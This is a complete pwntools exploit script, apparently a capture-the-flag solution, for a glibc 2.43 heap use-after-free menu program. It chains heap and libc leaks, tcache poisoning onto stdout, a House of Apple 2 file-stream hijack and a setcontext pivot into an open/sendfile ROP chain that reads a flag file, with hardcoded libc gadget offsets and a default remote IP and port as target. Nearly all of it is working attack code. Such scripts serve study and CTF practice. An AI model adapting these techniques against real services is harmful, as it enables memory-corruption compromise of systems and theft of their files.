#!/usr/bin/env python3
# 06-fsop: heap UAF menu (glibc 2.43, seccomp: execve/execveat only)
#   leak heap (safe-linked tail fd) -> poison tcache (heap target) ->
#   forge size 0x441 on c3 -> free -> unsorted (idx 66 >= 64 bins, cap-proof) ->
#   leak libc -> poison tcache -> allocate at _IO_2_1_stdout_ ->
#   House of Apple 2: vtable=_IO_wfile_jumps, wide_vtable->+0x68 = setcontext+61
#   (rdx=rdi=fp) -> rsp=stdout->_wide_data, r8=write_ptr=0x100 -> ORW ROP
import sys
import time
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'
context.timeout = 3

FLAG_PATH = (sys.argv[4].encode() + b'\x00') if len(sys.argv) > 4 else b'flag\x00'

OFF_OPEN        = 0x127990
OFF_READ        = 0x128150
OFF_WRITE       = 0x128c10
OFF_EXIT        = 0xf7180
OFF_SETCTX61    = 0x4bebd
OFF_WFILE_JUMPS = 0x211228
OFF_STDOUT      = 0x213580
OFF_POP_RDI     = 0x11b9fa
OFF_POP_RSI     = 0x5c067
OFF_POP_RBP     = 0x28a8d
OFF_POP2        = 0x28a8b      # pop r13 ; pop rbp ; ret
OFF_POP3        = 0x11ccb6     # pop r12 ; pop r13 ; pop r14 ; ret
OFF_MOV_RDX_R8  = 0xb7603      # mov eax,ecx ; mov rdx,r8 ; ret  (r8==0 after open)
OFF_SENDFILE    = 0x128200     # mov r10,rcx ; eax=0x28 ; syscall (count=rcx garbage-huge)
MAIN_ARENA      = 0x212a68

mode = sys.argv[1] if len(sys.argv) > 1 else 'remote'
if mode == 'remote':
    io = remote(sys.argv[2] if len(sys.argv) > 2 else '219.216.64.241', int(sys.argv[3]) if len(sys.argv) > 3 else 36813)
else:
    io = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './pwn'],
                 cwd='/root/06-fsop')

def add(i):
    io.recvuntil(b'5.exit'); io.sendline(b'1')
    io.recvuntil(b'idx: '); io.sendline(str(i).encode())
    io.recvuntil(b'ok\n')

def dele(i):
    io.recvuntil(b'5.exit'); io.sendline(b'2')
    io.recvuntil(b'idx: '); io.sendline(str(i).encode())
    io.recvuntil(b'ok\n')

def edit(i, data):
    io.recvuntil(b'5.exit'); io.sendline(b'3')
    io.recvuntil(b'idx: '); io.sendline(str(i).encode())
    time.sleep(0.03)
    io.send(data)
    io.recvuntil(b'ok\n')

def show(i):
    io.recvuntil(b'5.exit'); io.sendline(b'4')
    io.recvuntil(b'idx: '); io.sendline(str(i).encode())
    return io.recvn(0x10)

# ---- heap setup: c0..c8 (c_i = heap+0x10+0x110*i, tcache struct lazily after) ----
for i in range(9):
    add(i)

# ---- leak heap: free two, c0 is tcache tail -> fd = c0>>12 ----
dele(0)
dele(1)
heap_base = u64(show(0)[:8]) << 12
c = lambda i: heap_base + 0x10 + 0x110*i
log.info(f'heap base = {heap_base:#x} (c0={c(0):#x})')

def mangle(src, dst):
    return (src >> 12) ^ dst

# ---- libc leak: forge c3->size = 0x441 via overlap alloc at c3-0x10 ----
T = c(3) - 0x10                       # fake alloc target (c3's header)
edit(1, p64(mangle(c(1), T)))         # c1 is tcache head
add(9)                                # c1 back (pool[9])
add(10)                               # T (pool[10])
edit(10, p64(0) + p64(0x441))         # c3->size = 0x441 (idx 66 -> no tcache)
dele(3)                               # -> unsorted bin
leak = u64(show(3)[:8])               # fd = main_arena+0x60
log.info(f'unsorted fd = {leak:#x}')
if mode == 'calib':
    lb = int([l for l in open(f'/proc/{io.pid}/maps').read().splitlines()
              if 'libc.so.6' in l][0].split('-')[0], 16)
    log.success(f'libc base = {lb:#x}  => main_arena+0x60 = {leak - lb:#x}')
    io.close()
    sys.exit(0)
libc_base = leak - MAIN_ARENA - 0x60
log.info(f'libc base = {libc_base:#x}')
libc = lambda off: libc_base + off
stdout = libc(OFF_STDOUT)

# ---- poison tcache -> _IO_2_1_stdout_ ----
dele(2)
dele(4)                               # head = c4
edit(4, p64(mangle(c(4), stdout)))
add(11)                               # W = c4
add(12)                               # stdout

# ---- payloads ----
V = c(1)                              # pool[9]: fake wide vtable
W = c(4)                              # pool[11]: rsp pivot + ROP + wide_data
buf = c(2) + 0x10                     # path + flag buffer (pool[2])
path = buf
lock = W + 0x100                      # writable zero (c5 prev_size slot)

edit(9, p64(0) * 13 + p64(libc(OFF_SETCTX61)))          # V+0x68 = setcontext+61
edit(2, p64(0) * 2 + FLAG_PATH)                          # path string

rop = flat({
    0x00: 0,                          # junk -> rbp
    0x08: libc(OFF_POP2),             # eats W+0x10, W+0x18
    0x10: 0,
    0x18: 0,                          # wide_data->_IO_write_base == 0 (required)
    0x20: libc(OFF_POP2),             # eats W+0x28, W+0x30
    0x28: 0,
    0x30: 0,                          # wide_data->_IO_buf_base == 0 (required)
    0x38: libc(OFF_POP_RDI),
    0x40: path,
    0x48: libc(OFF_POP_RSI),
    0x50: 0,                          # O_RDONLY
    0x58: libc(OFF_OPEN),
    0x60: libc(OFF_POP_RDI),
    0x68: 1,                          # out_fd = stdout
    0x70: libc(OFF_POP_RSI),
    0x78: 3,                          # in_fd = flag
    0x80: libc(OFF_MOV_RDX_R8),       # rdx = r8 = 0 (open wrapper xor'd r8) -> NULL offset
    0x88: libc(OFF_SENDFILE),         # sendfile(1, 3, NULL, rcx=huge) -> EOF-clamped
    0x90: libc(OFF_POP_RDI),
    0x98: 0,
    0xa0: libc(OFF_POP3),             # pops W+0xa8..0xb8, ret -> 0xc0
    0xa8: 0,
    0xb0: 0,
    0xb8: 0,
    0xc0: libc(OFF_EXIT),
    0xe0: V,                          # wide_vtable ptr (behind chain end)
}, filler=b'\x00')

fp = flat({
    0x00: 0xfbad0000,                 # flags: magic, no NO_WRITES/UNBUFFERED/PUTTING/USER_LOCK
    0x20: 0x10,                       # write_base < write_ptr (flush condition)
    0x28: 0x100,                      # write_ptr -> r8 -> rdx = 0x100
    0x68: path,                       # _chain -> rdi for open()
    0x70: 0,                          # _flags2 -> rsi = 0
    0x88: lock,                       # _lock writable; open mode (ignored)
    0xa0: W,                          # _wide_data (also rsp after setcontext)
    0xa8: libc(OFF_POP_RBP),          # rip[1]
    0xc0: 0,                          # _mode = 0
    0xd8: libc(OFF_WFILE_JUMPS),
    0xe0: heap_base + 0xca0,          # fpregs ptr -> zeroed top-chunk area for fldenv
}, filler=b'\x00')

edit(11, rop)                          # null -> c5 size LSB (inside unsorted chunk, unused)
edit(12, fp)                           # null -> stdout+0x108 (.data tail, unused)

# ---- trigger: exit -> _IO_cleanup -> _IO_flush_all ----
io.recvuntil(b'5.exit')
io.sendline(b'5')
data = io.recvall(timeout=5)
log.info(f'output: {data[:0x60]}')
flag = data.split(b'\x00')[0]
log.success(f'FLAG: {flag}')
io.close()
